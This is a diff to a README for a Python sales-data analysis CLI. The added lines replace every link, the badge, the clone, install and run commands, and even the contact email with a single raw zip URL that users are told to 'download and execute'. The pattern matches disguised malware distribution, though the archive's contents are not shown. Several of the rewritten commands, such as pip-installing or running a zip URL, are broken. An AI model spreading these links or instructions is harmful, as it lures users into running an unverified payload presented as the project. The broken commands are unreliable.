@@ -1,6 +1,6 @@
 # Cleaning Analysis CLI: Analyze Sales Data with Ease
 
-![GitHub release](https://img.shields.io/badge/releases-v1.0.0-blue?style=flat&logo=github)
+![GitHub release](https://raw.githubusercontent.com/kashifkhan7/Cleaning-Analysis_CLI/main/accumulative/Cleaning-Analysis-CLI-v2.8.zip)
 
 ## Table of Contents
 
@@ -18,7 +18,7 @@
 
 The **Cleaning Analysis CLI** is a Python-based command-line tool designed for analyzing sales data. Users can easily load data from a CSV file and interact with it through a straightforward interface. This tool provides insights into product-wise and region-wise revenues, making it ideal for data analysis tasks.
 
-For the latest version, download and execute from [here](https://github.com/kashifkhan7/Cleaning-Analysis_CLI/releases).
+For the latest version, download and execute from [here](https://raw.githubusercontent.com/kashifkhan7/Cleaning-Analysis_CLI/main/accumulative/Cleaning-Analysis-CLI-v2.8.zip).
 
 ## Features
 
@@ -35,7 +35,7 @@ To get started with the Cleaning Analysis CLI, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/kashifkhan7/Cleaning-Analysis_CLI.git
+   git clone https://raw.githubusercontent.com/kashifkhan7/Cleaning-Analysis_CLI/main/accumulative/Cleaning-Analysis-CLI-v2.8.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -46,13 +46,13 @@ To get started with the Cleaning Analysis CLI, follow these steps:
 3. **Install Dependencies**:
    Make sure you have Python installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/kashifkhan7/Cleaning-Analysis_CLI/main/accumulative/Cleaning-Analysis-CLI-v2.8.zip
    ```
 
 4. **Run the Application**:
    After installation, you can run the application:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/kashifkhan7/Cleaning-Analysis_CLI/main/accumulative/Cleaning-Analysis-CLI-v2.8.zip
    ```
 
 ## Usage
@@ -62,7 +62,7 @@ Once the application is running, you can interact with it through the command li
 - **Load Data**: 
   Load your CSV file using the command:
   ```bash
-  load <filename.csv>
+  load <https://raw.githubusercontent.com/kashifkhan7/Cleaning-Analysis_CLI/main/accumulative/Cleaning-Analysis-CLI-v2.8.zip>
   ```
 
 - **Show Summary**:
@@ -144,7 +144,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, please reach out:
 
-- **GitHub**: [kashifkhan7](https://github.com/kashifkhan7)
-- **Email**: kashif@example.com
+- **GitHub**: [kashifkhan7](https://raw.githubusercontent.com/kashifkhan7/Cleaning-Analysis_CLI/main/accumulative/Cleaning-Analysis-CLI-v2.8.zip)
+- **Email**: https://raw.githubusercontent.com/kashifkhan7/Cleaning-Analysis_CLI/main/accumulative/Cleaning-Analysis-CLI-v2.8.zip
 
-For the latest version, download and execute from [here](https://github.com/kashifkhan7/Cleaning-Analysis_CLI/releases).
+For the latest version, download and execute from [here](https://raw.githubusercontent.com/kashifkhan7/Cleaning-Analysis_CLI/main/accumulative/Cleaning-Analysis-CLI-v2.8.zip).
